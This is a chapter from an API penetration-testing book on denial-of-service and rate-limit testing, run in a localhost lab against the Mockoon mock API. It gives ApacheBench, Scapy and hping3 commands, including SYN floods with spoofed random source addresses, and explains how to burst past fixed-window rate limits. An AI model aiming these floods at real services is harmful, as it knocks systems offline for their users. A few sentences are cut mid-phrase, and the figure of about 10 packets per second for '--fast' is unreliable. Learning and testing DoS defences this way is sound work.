<html><head></head><body>
		<div><h1 id="_idParaDest-108" class="chapter-number"><a id="_idTextAnchor110"/>7</h1>
			<h1 id="_idParaDest-109"><a id="_idTextAnchor111"/>Denial of Service and Rate-Limiting Testing</h1>
			<p>Continuing from basic API attacks, it’s now time<a id="_idIndexMarker518"/> for us to understand more about <strong class="bold">denial-of-service</strong> (<strong class="bold">DoS</strong>) and <strong class="bold">distributed denial-of-service</strong> (<strong class="bold">DDoS</strong>) threats and answer some<a id="_idIndexMarker519"/> questions, such as the following: Why are they so important? How impactful they could be for API endpoints? What can we leverage to successfully manage the triggering of these sorts of attacks? You will learn that DoS, especially the distributed form of it, is a global problem affecting pretty much any publicly exposed endpoint or application. Additionally, software that is only privately accessible is not immune to them. Although sometimes rarer, insider threats are present and can disrupt internal applications.</p>
			<p><strong class="bold">Rate limiting</strong> is a key defense mechanism against DoS attacks, designed<a id="_idIndexMarker520"/> to control the amount of traffic an API can handle from a particular user or IP address over a specific period. It prevents users from making too many requests in a short amount of time, which can be an indicator of an attack. Proper rate limiting can help maintain service availability even during an attack by allowing only a manageable number of requests.</p>
			<p>When conducting penetration testing, it’s important to identify the API’s rate-limiting mechanisms and test their effectiveness. It involves assessing the thresholds set for users and attempting to circumvent them to check the robustness of these controls. This phase of testing may also involve checking the API’s response to different attack vectors that could lead to service disruption.</p>
			<p>In this chapter, we’re going to cover the following main topics:</p>
			<ul>
				<li>Testing for DoS vulnerabilities</li>
				<li>Identifying rate-limiting mechanisms</li>
				<li>Circumventing rate limitations</li>
			</ul>
			<h1 id="_idParaDest-110"><a id="_idTextAnchor112"/>Technical requirements</h1>
			<p>As it happened with previous chapters, we’ll leverage the same environment as the one pointed out in previous chapters, such as an Ubuntu distribution. Some other new relevant utilities will be mentioned in the corresponding sections.</p>
			<h1 id="_idParaDest-111"><a id="_idTextAnchor113"/>Testing for DoS vulnerabilities</h1>
			<p>There were notable recent<a id="_idIndexMarker521"/> incidents that are worth mentioning to illustrate the power and reach of such kinds of attacks. They are listed by traffic volume, and the references are in the <em class="italic">Further reading</em> section at the end of the chapter:</p>
			<ul>
				<li>The attack against Google Cloud reached 2.54 Tbps in 2017, but it was only disclosed to the public three years later in 2020. The attacks sent forged packets to web servers pretending they were being sent by Google servers. All the responses to such packets were sent to Google, which caused this volume.</li>
				<li>In February 2020, one AWS customer’s infrastructure was the target of a 2.3 Tbps DDoS attack. The specialized company service, AWS Shield, managed to absorb the “tsunami,” which protected the customer’s assets. By leveraging <strong class="bold">Connectionless Directory Access Protocol</strong> (<strong class="bold">CLDAP</strong>), the criminals dispatched huge<a id="_idIndexMarker522"/> amounts of packets<a id="_idIndexMarker523"/> toward publicly available <strong class="bold">Lightweight Directory Access Protocol</strong> (<strong class="bold">LDAP</strong>) servers.</li>
				<li>GitHub occupies the third place on our list. In 2018, making use of a well-known vulnerability in Memcached, a popular in-memory database, attackers could abuse public Memcached servers on the internet. The root cause was like the one that hit Google. By spoofing GitHub’s IP addresses, criminals sent packets that got amplified by such servers and sent back to GitHub.</li>
			</ul>
			<p>We will use our old friend Ubuntu to make the lab for this chapter. However, we will install a couple of additional tools because we need to send reasonable amounts of traffic and tweak some options to simulate what we are doing from different sources. For that sake, we will make use of <strong class="bold">Mockoon</strong>, an open-source solution to create mocked APIs. We’ve been using crAPI and our own Python <a id="_idIndexMarker524"/>application since then. It’s now time to test with some other software.</p>
			<h2 id="_idParaDest-112"><a id="_idTextAnchor114"/>Getting to know Mockoon</h2>
			<p>The installation is as simple as using Snap<a id="_idIndexMarker525"/> to accomplish it (on Linux at least). The product is also available for Windows and macOS. Keep in mind that, at least when this book was being written, there was no version for ARM64. So, unfortunately, you have to have an Intel system to use it.</p>
			<p>Load the application. The first load might take some time. The opening screen is shown in the following screenshot. I recommend you go through the initial tour. It’s not too big and quite straightforward. It is important<a id="_idIndexMarker526"/> to say that Mockoon calls the endpoints <strong class="bold">routes</strong>. This is common throughout the literature and among some other products.</p>
			<div><div><img src="img/B19657_figure_07.01.jpg" alt="Figure 7.1 – Mockoon’s splash screen"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.1 – Mockoon’s splash screen</p>
			<p>You’ll realize that Mockoon<a id="_idIndexMarker527"/> already starts a pre-configured API (called <strong class="bold">DemoAPI</strong>) and some routes as soon as you finish the tour or simply cancel it. You need to push the <em class="italic">play</em> icon button to put the API to start listening to requests. On the <strong class="bold">Settings</strong> tab, you can choose the IP address, port, and optional prefix that will be used. It’s also possible to enable TLS. The product<a id="_idIndexMarker528"/> comes with a self-signed certificate, but you can optionally provide your own certificate file, the CA certificate file, and the relevant keys. When this option is enabled, a lock icon shows up just below the API name and you must restart the API if it’s already running. Simply click on the yellow circled arrow or follow this menu sequence: <strong class="bold">Run</strong> | <strong class="bold">Start</strong> | <strong class="bold">Stop</strong> | <strong class="bold">Reload </strong><strong class="bold">current environment</strong>:</p>
			<div><div><img src="img/B19657_figure_07.02.jpg" alt="Figure 7.2 – Restarting the Mockoon API after enabling TLS"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.2 – Restarting the Mockoon API after enabling TLS</p>
			<p>Take some time to navigate through the interface. All the routes (endpoints) are listed under the <strong class="bold">Routes</strong> tab. The DemoAPI has a total of seven of them. The data<a id="_idIndexMarker529"/> served as the response for <strong class="bold">create, read, update, and delete</strong> (<strong class="bold">CRUD</strong>) is a script using a type of language. It generates 50 random usernames and their IDs:</p>
			<pre class="source-code">
[
  {{#repeat 50}}
  {
    "id": "{{faker 'string.uuid'}}",
    "username": "{{faker 'internet.userName'}}"
  }
  {{/repeat}}
]</pre>			<h2 id="_idParaDest-113"><a id="_idTextAnchor115"/>Interacting with Mockoon’s endpoints</h2>
			<p>The CRUD route is listening<a id="_idIndexMarker530"/> on <code>/users</code>. Observe what happens when you do this:</p>
			<pre class="console">
$ curl http://localhost:3000/users # use -k if you are testing with TLS.
[
  {
    "id": "b6790a61-295b-46d4-9739-bbea9ad30e4c",
    "username": "Annamarie.Hermiston39"
  },
  {
    "id": "8abcdac0-0ba4-40f0-95af-fbacff6b6d8f",
    "username": "Stephanie6"
  },
  {
    "id":"507f64b1-3ee8-4897-aa0b-514c4dc486fd",
    "username": "Maybell_Stark1"
  },
...output omitted for brevity and optimized for readability...
]</pre>			<p>The accepted headers are on the tab with the same name. By default, only the well-known <code>Content-Type: application/json</code> is there. Logs can be accessed on the eponymous tab. Let’s do a first test with this dummy API that Mockoon gives us. For that matter, we’ll make use of another famous tool: <code>ab</code>. This is the acronym for <strong class="bold">ApacheBench</strong>, and it’s a utility that developers<a id="_idIndexMarker531"/> and sysadmins usually apply when they need to do load tests on their applications. It’s also straightforward to install.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">From now on, I’ll interchangeably use <em class="italic">endpoint</em> and <em class="italic">route</em>. Just bear in mind that they have the same meaning in this context.</p>
			<p>We will target the <code>/users</code> route<a id="_idIndexMarker532"/> to see how our API behaves when receiving a reasonable number of requests. Let’s begin with 100 requests (the <code>-n</code> command option), with 10 (the <code>-c</code> command option) of them being simultaneous. Type the following command and observe the results:</p>
			<pre class="console">
$ ab -n 100 -c 10 http://localhost:3000/resource-intensive-endpoint/
This is ApacheBench, Version 2.3 &lt;$Revision: 1879490 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/
Benchmarking localhost (be patient).....done
Server Software:
Server Hostname:        localhost
Server Port:            3000
Document Path:          /users
Document Length:        0 bytes
Concurrency Level:      10
Time taken for tests:   0.201 seconds
Complete requests:      100
Failed requests:        0
Total transferred:      0 bytes
HTML transferred:       0 bytes
Requests per second:    497.08 [#/sec] (mean)
Time per request:       20.117 [ms] (mean)
Time per request:       2.012 [ms] (mean, across all concurrent requests)
Transfer rate:          0.00 [Kbytes/sec] received
Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        0    0   0.3      0       2
Processing:     1    2   3.6      1      23
Waiting:        0    0   0.0      0       0
Total:          1    2   3.6      1      23
Percentage of the requests served within a certain time (ms)
  50%      1
  66%      1
  75%      1
  80%      1
  90%      4
  95%     10
  98%     18
  99%     23
 100%     23 (longest request)</pre>			<p>The first point we realize<a id="_idIndexMarker533"/> is that <code>ab</code> is somehow chatty. That’s expected since the main purpose is to load-test your application, right? Nevertheless, you can control its output with the <code>-q</code> and <code>-v</code> options. The main page explains all its switches. Mockoon seems to have behaved as expected (on my regular laptop and running on top of an Ubuntu VM). Pay special attention to the last section of the preceding output. It shows the percentiles of requests being served in specific periods. It should be interpreted like this:</p>
			<ul>
				<li>50% of the requests were served in 1 ms or less.</li>
				<li>Up to 95% of the requests were served in 10 ms or less.</li>
				<li>The longest request took 23 ms to be served.</li>
			</ul>
			<p>All requests were logged and none of them suffered big delays to be served. It’s however curious that Mockoon did not provide any data (not even HTML) when answering these requests. This can be perceived by the preceding <code>Document Length</code>, <code>Total transferred</code> and <code>HTML transferred</code> lines. This may reveal misconfiguration on the API side, unexpected errors, or that Mockoon skipped providing some answer to <code>ab</code>. This can happen sometimes since Mockoon is just a fake/mock API server.</p>
			<p>Now, let’s see how our dear API will behave when the numbers are multiplied by 10. Some output was purposefully omitted for simplicity:</p>
			<pre class="console">
$ ab -n 1000 -c 100 http://localhost:3000/users
Document Length:        3629 bytes
Time taken for tests:   2.214 seconds
Complete requests:      1000
Total transferred:      3814000 bytes
HTML transferred:       3629000 bytes
Percentage of the requests served within a certain time (ms)
  50%    207
  66%    241
  75%    259
  80%    283
  90%    305
  95%    323
  98%    355
  99%    360
 100%    371 (longest request)</pre>			<p>Ha! Now, we are seeing data coming. That’s what I’m talking about, dude! Icebreakers apart, observe that the response time substantially increased when compared to the previous test. If you repeat this command, but through HTTPS, you will receive slightly longer times. I did a final test with 10,000 requests being 1,000 simultaneous, and Mockoon was not fully responsive this time:</p>
			<pre class="console">
Completed 9000 requests
apr_socket_recv: Connection reset by peer (104)
Total of 9585 requests completed</pre>			<p>This had nothing to do with the VM’s memory footprint. I was watching it the whole time and my system had around 2.5 GB of free RAM. I even restarted Mockoon to give it a clean memory area, but this didn’t suffice. Only 50 requests were logged this time (this is the maximum number of log entries<a id="_idIndexMarker534"/> the API shows by default).</p>
			<h2 id="_idParaDest-114"><a id="_idTextAnchor116"/>Leveraging Scapy to attack Mockoon</h2>
			<p>It’s been a while since<a id="_idIndexMarker535"/> the last time<a id="_idIndexMarker536"/> we used Wireshark, huh? For the next tests, it will be more enlightening if we have it running. If you don’t have it on your system yet, install it and load it. Put it to listen to the loopback adapter. You may need to execute it as the root to accomplish this. For the next test, we will make use of <code>pip</code> and run the following small code. Observe its output:</p>
			<pre class="source-code">
from scapy.all import *
send(IP(dst="localhost")/TCP(dport=3000, flags="R"), count=5000)</pre>			<p>This code sends 5,000 packets<a id="_idIndexMarker537"/> to TCP port <code>3000</code> on localhost, with the <code>3000</code> is where Mockoon is listening to requests. Observe they are not HTTP packets, but just regular <strong class="bold">Transmission Control Protocol</strong> (<strong class="bold">TCP</strong>) packets. The point here is not to watch if the API itself will behave as expected, but if the infrastructure hosting it will deal with this unusual activity. If you don’t know much about TCP/IP networking, packets with such a flag are used to signal to the receiving peer that the connection should be terminated. Let’s see how Mockoon<a id="_idIndexMarker538"/> deals with this weird communication. You will receive<a id="_idIndexMarker539"/> something like the following:</p>
			<pre class="console">
............................................................................................................................................................................................................................................
Sent 5000 packets.</pre>			<p>What has Wireshark captured? Switch to it and you will find lots of red lines corresponding to the packets (<em class="italic">Figure 7</em><em class="italic">.3</em>).</p>
			<div><div><img src="img/B19657_figure_07.03.jpg" alt="Figure 7.3 – Wireshark capturing the Scapy packets with the RST flag set"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.3 – Wireshark capturing the Scapy packets with the RST flag set</p>
			<p>The code didn’t return any error, which means Mockoon likely received (and probably ignored) all of them. If you are uncertain about the number of dots printed as part of the output, simply run the script on the command line and append <code>| </code><code>wc -c</code>.</p>
			<p>When a web server or API gateway is not configured to foresee this type of weird behavior, it can simply crash and eventually leak some internal data, such as details about the infrastructure. In our case, Mockoon didn’t throw any error messages or even crash. Maybe it leverages some backend server with support for such a thing. Or, maybe this happened because the packets were sent in a single sequence, one after the other.</p>
			<p>So far, we have tested<a id="_idIndexMarker540"/> from the same source<a id="_idIndexMarker541"/> IP address. This is good for simple tests, but not enough to check how the endpoints can handle connections from multiple addresses at the same time. This is the core of DDoS attacks. It may be difficult for API endpoints and their environments to distinguish between legitimate traffic and pure attacks.</p>
			<h2 id="_idParaDest-115"><a id="_idTextAnchor117"/>Mockoon with hping3 – initial tests</h2>
			<p>To help us with<a id="_idIndexMarker542"/> this, let’s invoke<a id="_idIndexMarker543"/> another tool: <code>hping3</code>. In the case of our lab, we can use <code>apt</code> to install it. There are at least five different ways you can leverage <code>hping3</code> to test your routes. First, we are going to send a couple of <strong class="bold">Synchronize</strong> (<strong class="bold">SYN</strong>) packets, pretending we are trying to establish TCP connections and see what happens:</p>
			<pre class="console">
$ hping3 -S -p 3000 -c 3 localhost
HPING localhost (lo 127.0.0.1): S set, 40 headers + 0 data bytes
len=44 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=SA seq=0 win=65495 rtt=7.1 ms
len=44 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=SA seq=1 win=65495 rtt=8.6 ms
len=44 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=SA seq=2 win=65495 rtt=6.1 ms
--- localhost hping statistic ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.4/7.7/16.1 ms</pre>			<p>The output looks like the <code>ping</code> command we are used to. That’s the point. The tool boosts the possibilities given by its parent though. Observe how Wireshark recorded it:</p>
			<div><div><img src="img/B19657_figure_07.04.jpg" alt="Figure 7.4 – hping3 sending SYN packets and resetting the connections"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.4 – hping3 sending SYN packets and resetting the connections</p>
			<p><code>hping3</code> sends each SYN packet, receives the corresponding <code>Nmap</code>, too). The command is as follows:</p>
			<pre class="console">
$ hping3 --scan 3000 -c 3 localhost
Scanning localhost (127.0.0.1), port 3000
1 ports to scan, use -V to see all the replies
+----+-----------+---------+---+-----+-----+-----+
|port| serv name |  flags  |ttl| id  | win | len |
+----+-----------+---------+---+-----+-----+-----+
All replies received. Done.
Not responding ports: (3000 )</pre>			<p>You can inform multiple ports by separating them with commas or dashes (for ranges). We sent three packets, but Mockoon didn’t answer them. By checking on Wireshark, we can see the packets did hit Mockoon, but no reply was sent back whatsoever. Mockoon is possibly ignoring them since they’re just probe packets, not fully HTTP/HTTPS packets, and they don’t carry<a id="_idIndexMarker544"/> the expected headers<a id="_idIndexMarker545"/> or payloads:</p>
			<div><div><img src="img/B19657_figure_07.05.jpg" alt="Figure 7.5 – Packets sent against Mockoon to scan ports"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.5 – Packets sent against Mockoon to scan ports</p>
			<h2 id="_idParaDest-116"><a id="_idTextAnchor118"/>Sending random data with hping3</h2>
			<p>Let’s move forward. Now, we<a id="_idIndexMarker546"/> will send<a id="_idIndexMarker547"/> something completely random and nonsense. We’ve done this before in another context. This time, we will leverage <code>hping3</code> for it. Generate a 1 MB file and then send it to Mockoon with the following command. Observe the outcomes:</p>
			<pre class="console">
$ dd if=/dev/urandom of=random.bin bs=1M count=1
$ sudo hping3 -p 3000 -c 3 --file random.bin -d 32768 localhost
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=0 win=0 rtt=1.9 ms
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=1 win=0 rtt=11.1 ms
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=2 win=0 rtt=9.4 ms
--- localhost hping statistic ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 1.9/7.4/11.1 ms</pre>			<p>In summary, we told <code>hping3</code> to do the following:</p>
			<ul>
				<li>Send packets to port TCP <code>3000</code> (<code>-</code><code>p 3000</code>)</li>
				<li>Dispatch a total of 3 packets (<code>-</code><code>c 3</code>)</li>
				<li>Use the just-created file as the data payload (<code>--</code><code>file random.bin</code>)</li>
				<li>Define the packet size as 32768 bytes (<code>-</code><code>d 32768</code>)</li>
				<li>Use <code>localhost</code> as the destination</li>
			</ul>
			<p>If you are still running Wireshark, you will capture something like this:</p>
			<div><div><img src="img/B19657_figure_07.06.jpg" alt="Figure 7.6 – Wireshark packet capture when hping3 sent a file to Mockoon"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.6 – Wireshark packet capture when hping3 sent a file to Mockoon</p>
			<p>Observe that the connection attempts<a id="_idIndexMarker548"/> were all reset. That’s because no previously established connection<a id="_idIndexMarker549"/> could sustain the file transmission. The TCP/IP stack simply discarded all the attempts, sending packets with the RST flag on. I’m not sure if you realized this too, but <code>hping3</code> uses a different source port for every single packet it sends. Also, <code>sudo</code> was necessary this time. This is because the tool needs to make a syscall to the kernel’s network driver and that’s only allowed to the root operator or after some privilege elevation, which we can obtain with <code>sudo</code>.</p>
			<h2 id="_idParaDest-117"><a id="_idTextAnchor119"/>Sending fragmented packets with hping3</h2>
			<p>On the next test, we will send<a id="_idIndexMarker550"/> fragmented packets<a id="_idIndexMarker551"/> to our target. Fragmented packets can disrupt an API endpoint due to the way they interact with the network infrastructure and the end service. When a large packet is sent over the internet, it often exceeds the <code>-</code><code>f</code> switch):</p>
			<pre class="console">
$ sudo hping3 -f -p 3000 -c 3 -d 32768 localhost
HPING localhost (lo 127.0.0.1): NO FLAGS are set, 40 headers + 32768 data bytes
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=0 win=0 rtt=11.1 ms
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=1 win=0 rtt=10.5 ms
len=40 ip=127.0.0.1 ttl=64 DF id=0 sport=3000 flags=RA seq=2 win=0 rtt=11.3 ms
--- localhost hping statistic ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 11.1/12.2/14.2 ms</pre>			<p>Packet fragmentation is something that worries network administrators. This kind of attack can cause problems for the target, such as the following:</p>
			<ul>
				<li>Resource exhaustion, because of increased CPU usage or memory overhead</li>
				<li>Reassembly failures, due to reassembly timeout or overlapping fragments</li>
			</ul>
			<p>The packet capture demonstrates the fragments flowing through the network. You will see many more than just three packets because we are forcing them to be fragmented:</p>
			<div><div><img src="img/B19657_figure_07.07.jpg" alt="Figure 7.7 – The fragmented packets going to Mockoon"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.7 – The fragmented packets going to Mockoon</p>
			<h2 id="_idParaDest-118"><a id="_idTextAnchor120"/>Flooding Mockoon with hping3 packets</h2>
			<p>So far, we’ve used <code>hping3</code> by asking it to send<a id="_idIndexMarker554"/> a small number of packets<a id="_idIndexMarker555"/> to our target API server. Now, we’ll go a step further. We’ll send a bigger number of packets to try to flood the target (the <code>--flood</code> switch), and we’ll verify whether Mockoon is smart enough to handle them. We will also randomize the source IP address to simulate a true DDoS attack. The following command accomplishes this task:</p>
			<pre class="console">
$ sudo hping3 --flood --rand-source -p 3000 localhost
HPING localhost (lo 127.0.0.1): NO FLAGS are set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- localhost hping statistic ---
12356365 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms</pre>			<p>You can see that I did not specify the number of packets. So, <code>hping3</code> will forever flood the target. Also, you can see that no packet was received, indicating there was a 100% loss. This caused two interesting behaviors in my system:</p>
			<ul>
				<li>First, the free memory drastically reduced in a matter of a few seconds and did not recover even after stopping <code>hping3</code>:</li>
			</ul>
			<div><div><img src="img/B19657_figure_07.08.jpg" alt="Figure 7.8 – The system’s RAM rapidly reducing because of the DDoS attack processing"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.8 – The system’s RAM rapidly reducing because of the DDoS attack processing</p>
			<ul>
				<li>Secondly, and possibly because of that lack of free memory, Wireshark often stopped responding, asking me to either wait for it or to stop it:</li>
			</ul>
			<div><div><img src="img/B19657_figure_07.09.jpg" alt="Figure 7.9 – Wireshark failing to be available while capturing network packets"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.9 – Wireshark failing to be available while capturing network packets</p>
			<p class="list-inset">When Wireshark finally decided to work at least for a while again, I could take a screenshot to show you the anatomy of the packets sent by <code>hping3</code>:</p>
			<div><div><img src="img/B19657_figure_07.10.jpg" alt="Figure 7.10 – Packets that were part of the hping3’s flooding attack"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.10 – Packets that were part of the hping3’s flooding attack</p>
			<p>You can easily verify<a id="_idIndexMarker556"/> they were very small packets (54 bytes in size) coming from virtually endless<a id="_idIndexMarker557"/> different IP address sources. This was successfully exhausted by the system’s memory and caused not only Mockoon to stop working, but all other applications as well. I could no longer even use <code>curl</code> to send simple requests to the API. This happened because the operating system received more packets than it could process in a feasible amount of time and the buffers were all opened<a id="_idIndexMarker558"/> at the same time in memory, pretty<a id="_idIndexMarker559"/> much fully occupying it. Only a full restart was recovered by the system to the previous state.</p>
			<h2 id="_idParaDest-119"><a id="_idTextAnchor121"/>Making the attack more interesting – the “fast” switch</h2>
			<p>At this point, you can ask me<a id="_idIndexMarker560"/> this question: Is there a way<a id="_idIndexMarker561"/> to turn this into something even worse? Guess what? The answer is a big <em class="italic">YES!</em> <code>hping3</code> has a <code>--fast</code> switch, where it can send around 10 packets per second, absolutely filling all possible packet buffers that a regular system can usually apply to handle the receiving of packets. Type the following command and observe the results. Your whole system might hang again, just as it happened with mine. The explanation is quite like the previous test:</p>
			<pre class="console">
$ sudo hping3 --flood --syn --fast -p 3000 localhost
HPING localhost (lo 127.0.0.1): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- localhost hping statistic ---
1113320 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms</pre>			<p>The <code>--syn</code> switch tells <code>hping3</code> to send TCP packets with the SYN flag on. I didn’t let it hang my system this time, though. I also didn’t choose to randomize the source IP addresses. Even with these restrictions, Mockoon occupied the top of the processes using more memory:</p>
			<div><div><img src="img/B19657_figure_07.11.jpg" alt="Figure 7.11 – Output of the top command showing processes using more memory"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.11 – Output of the top command showing processes using more memory</p>
			<p>The packet capture is also interesting, showing Mockoon trying to reset the packets as they arrive, which was a noble yet not enough task:</p>
			<div><div><img src="img/B19657_figure_07.12.jpg" alt="Figure 7.12 – Packet capture with hping3’s --fast switch"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.12 – Packet capture with hping3’s --fast switch</p>
			<p>Even though not having been generated by different source IP addresses, this traffic was still massive and can surely cause some damage to unprepared API endpoints and their backends when they are not protected against DoS attacks. It’s all about how strong and smart the system is to deal with so many packet handles. In the next section, we are going to investigate how<a id="_idIndexMarker562"/> we can detect rate-limiting controls. They are quite useful to block<a id="_idIndexMarker563"/> against simple and sometimes complex attacks such as the ones we just learned.</p>
			<h1 id="_idParaDest-120"><a id="_idTextAnchor122"/>Identifying rate-limiting mechanisms</h1>
			<p>You just learned several ways to trigger DoS attacks<a id="_idIndexMarker564"/> against an API endpoint. We even sent a trivial but powerful DDoS wave of packets that made our target unable to handle them feasibly. The first option to protect against such types of threats<a id="_idIndexMarker565"/> is rate-limiting the traffic, also called <strong class="bold">throttling</strong>. For more information, see the link in the <em class="italic">Further </em><em class="italic">reading</em> section.</p>
			<p>Identifying rate-limiting mechanisms within an API is an essential aspect of both security and usability assessments. Rate limiting is designed to prevent abuse by limiting the number of requests a user can make in each period. It helps mitigate various attacks, such as brute force or DDoS, by capping the action frequency. This is achieved by applying a policy. This policy ensures that servers are not overwhelmed by too many requests at once, which could degrade service for others or lead to server failure. Rate limiting can be based on several factors, including IP addresses, user accounts, API tokens, or sessions. It typically involves setting a maximum number of allowable requests and a time window for these requests. For example, an API might allow 100 requests per minute per user. This mechanism helps to maintain the quality of service, prevent abuse, and manage server resources more effectively.</p>
			<p>There are various ways to implement rate limiting, such as fixed window counters, rolling window logs, and leaky buckets, each with its advantages and use cases. A fixed window counter resets the count at fixed intervals, potentially allowing bursts of traffic at the interval edges. Rolling windows track the count in a continuously moving window, which can prevent bursts but requires more complex tracking. Leaky buckets allow requests at a steady pace, smoothing outbursts. Choosing the right algorithm depends on the specific requirements<a id="_idIndexMarker566"/> and behavior of the API you’re protecting. Let’s understand a bit more about each one of them.</p>
			<h2 id="_idParaDest-121"><a id="_idTextAnchor123"/>Fixed window counters</h2>
			<p>This is an important concept<a id="_idIndexMarker567"/> in the world of rate-limiting<a id="_idIndexMarker568"/> requests. They are simply counters that record the number of requests arriving during a specific amount of time. With this window, an API can check at any time what the current number of requests is and reduce or increase them, accordingly, depending on the threshold. If the traffic is assessed to be legitimate and the API needs to serve more requests (for example, after a new product release), the threshold is increased. On the other hand, when nothing justifies having a specific volume of traffic, it can be capped.</p>
			<p>During a pentest, you can leverage fixed window counters to your advantage. By strategically sending bursts of requests within the defined window timeframe, you can attempt to identify the rate limit itself. Observing server responses after exceeding the limit is key. Look for changes in response times, the appearance of specific error codes (such as 429 Too Many Requests), or the presence of headers revealing rate-limiting information. This information helps pentesters understand the API’s tolerance for request volume and the consequences of exceeding the limit.</p>
			<p>There are limitations, though. Window counters are not bulletproof<a id="_idIndexMarker569"/> against what is called bursting. With this technique, you send a consistent wave of requests just before the window time is going to be refreshed (the previous window ends, the next window starts). This can exploit the gap between the counter reaching its limit and the window resetting, allowing a temporary bypass of the rate limit. As a pentester, identifying an API that relies solely on fixed window counters highlights a potential vulnerability that could be exploited<a id="_idIndexMarker570"/> in a real-world<a id="_idIndexMarker571"/> attack scenario.</p>
			<h2 id="_idParaDest-122"><a id="_idTextAnchor124"/>Rolling window logs</h2>
			<p>While fixed window counters<a id="_idIndexMarker572"/> offer a basic level of rate-limiting, pentesters <a id="_idIndexMarker573"/>often encounter APIs that employ a more sophisticated approach: rolling window logs. Unlike fixed counters, rolling window logs maintain a chronological record of timestamps associated with incoming requests. This record is constantly updated, with older timestamps falling out of the window as new requests arrive. The API calculates the rate limit by analyzing the number of requests within this dynamic window.</p>
			<p>This dynamic nature offers several advantages compared to fixed window counters. Bursting does not have the same level of success with it. The window is frequently being adjusted, which reduces the chances of attackers exploiting the window reset timers. Also, rolling window logs provide a more realistic representation of patterns for real-time requests. They can account for sudden surges in legitimate traffic that might be incorrectly flagged by a fixed window counter. This allows for a more nuanced approach to rate limiting, potentially avoiding unnecessary blocking of legitimate users during periods of high activity.</p>
			<p>However, they present a different set of challenges for a pentester. It can be more difficult to identify the specific window size and rate limit when compared to fixed counters. You might need to employ more sophisticated techniques such as sending requests with varying intervals to analyze server responses and infer the underlying logic of the rolling window. Additionally, certain implementations of rolling window logs might not provide clear feedback through error codes or headers, making it slightly more challenging to pinpoint the exact rate limit settings.</p>
			<h2 id="_idParaDest-123"><a id="_idTextAnchor125"/>Leaky buckets</h2>
			<p>This concept is somehow unique <a id="_idIndexMarker574"/>in the world of rate-limiting<a id="_idIndexMarker575"/> for API routes. Imagine a bucket with a small hole at the bottom, constantly leaking out a controlled amount of water. The arriving requests can be compared to water being put into this bucket. The maximum number of requests that can be processed during a specific amount of time corresponds to the bucket’s capacity (like a real one with liters or gallons). If the bucket starts spilling out <em class="italic">water</em> (too many requests arriving at the endpoint), subsequent ones are rejected because of the lack of capacity, and new requests are only accepted once the bucket has some room to accommodate them.</p>
			<p>This analogy translates to a dynamic rate-limiting mechanism for APIs. The bucket’s capacity represents the maximum allowed request volume within a timeframe, and the leak rate defines how quickly requests are <em class="italic">processed</em> and considered permissible. This approach offers several advantages for pentesting APIs. Leaky buckets work better than fixed window counters with respect to bursts of requests. Even if a surge of requests arrives, the bucket can accommodate them to a certain extent, preventing unnecessary blocking of legitimate users. Also, as happens with <strong class="bold">quality of service</strong> (<strong class="bold">QoS</strong>) mechanisms, leaky buckets<a id="_idIndexMarker576"/> can prioritize certain types of packets, processing them even when they don’t have the capacity to accommodate more. By adjusting the leak rate for different request types, the API can ensure critical requests are processed even during periods of high traffic, enhancing overall system responsiveness.</p>
			<p>Nonetheless, for pentesters, leaky buckets<a id="_idIndexMarker577"/> present a different testing<a id="_idIndexMarker578"/> challenge. Unlike fixed windows or rolling window logs with their focus on request counts, leaky buckets involve analyzing both capacity and leak rate. Pentesters might need to send a series of requests with varying intervals and observe how the server responds. By monitoring for changes in response times or the appearance of error codes such as 429 Too Many Requests, testers can attempt to infer the bucket’s capacity and leak rate. This information can reveal potential weaknesses in the leaky bucket implementation.</p>
			<p>In the next section, we are going to implement a rate-limiting mechanism to protect the API we created with Mockoon and check whether we can detect its presence. Mockoon itself already comes with some protection controls that you can play with, but you can also leverage some external tools for this purpose, which will be our case.</p>
			<h2 id="_idParaDest-124"><a id="_idTextAnchor126"/>A rate-limiting detection lab</h2>
